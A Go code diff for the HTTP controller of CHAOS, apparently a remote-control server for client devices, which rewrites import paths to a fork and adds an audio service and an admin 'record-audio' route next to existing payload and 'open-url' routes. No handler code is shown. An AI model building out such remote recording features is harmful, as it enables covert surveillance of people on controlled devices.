@@ -2,15 +2,16 @@ package http
 
 import (
 	"github.com/gin-gonic/gin"
+	"github.com/justadoll/CHAOS/internal/environment"
+	"github.com/justadoll/CHAOS/internal/middleware"
+	"github.com/justadoll/CHAOS/services/audio"
+	"github.com/justadoll/CHAOS/services/auth"
+	"github.com/justadoll/CHAOS/services/client"
+	"github.com/justadoll/CHAOS/services/device"
+	"github.com/justadoll/CHAOS/services/payload"
+	"github.com/justadoll/CHAOS/services/url"
+	"github.com/justadoll/CHAOS/services/user"
 	"github.com/sirupsen/logrus"
-	"github.com/tiagorlampert/CHAOS/internal/environment"
-	"github.com/tiagorlampert/CHAOS/internal/middleware"
-	"github.com/tiagorlampert/CHAOS/services/auth"
-	"github.com/tiagorlampert/CHAOS/services/client"
-	"github.com/tiagorlampert/CHAOS/services/device"
-	"github.com/tiagorlampert/CHAOS/services/payload"
-	"github.com/tiagorlampert/CHAOS/services/url"
-	"github.com/tiagorlampert/CHAOS/services/user"
 )
 
 type httpController struct {
@@ -23,6 +24,7 @@ type httpController struct {
 	DeviceService  device.Service
 	PayloadService payload.Service
 	UrlService     url.Service
+	AudioService   audio.Service
 }
 
 func NewController(
@@ -36,6 +38,7 @@ func NewController(
 	userService user.Service,
 	deviceService device.Service,
 	urlService url.Service,
+	AudioService audio.Service,
 ) {
 	handler := &httpController{
 		Configuration:  configuration,
@@ -47,6 +50,7 @@ func NewController(
 		UserService:    userService,
 		DeviceService:  deviceService,
 		UrlService:     urlService,
+		AudioService:   AudioService,
 	}
 
 	router.NoRoute(handler.noRouteHandler)
@@ -90,5 +94,6 @@ func NewController(
 		authGroup.POST("/upload", handler.uploadFileHandler)
 
 		adminGroup.POST("/open-url", handler.openUrlHandler)
+		adminGroup.POST("/record-audio", handler.recordAudioHandler)
 	}
 }
